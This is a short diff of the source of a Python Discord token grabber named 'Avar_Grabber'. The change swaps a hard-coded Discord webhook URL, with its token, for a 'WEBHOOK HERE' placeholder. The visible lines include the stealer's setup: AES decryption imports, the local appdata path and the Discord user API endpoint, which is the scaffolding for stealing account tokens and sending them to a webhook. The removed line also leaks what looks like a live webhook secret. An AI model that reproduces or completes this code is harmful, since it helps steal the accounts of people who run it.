@@ -1,4 +1,3 @@
-
 import os
 import requests
 import shutil
@@ -17,7 +16,7 @@ from Crypto.Cipher import AES
 
 class Avar_Grabber:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/907415831984623627/EZa8-81mZdwo4ii5DjPQSEKqRJBLzvAwG_pfFSx7E6fe75akB09V5GFQ-WQBfUXOlkzs" #replace WEBHOOK_HERE with your webhook
+        self.webhook = "WEBHOOK HERE" #replace WEBHOOK_HERE with your webhook
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
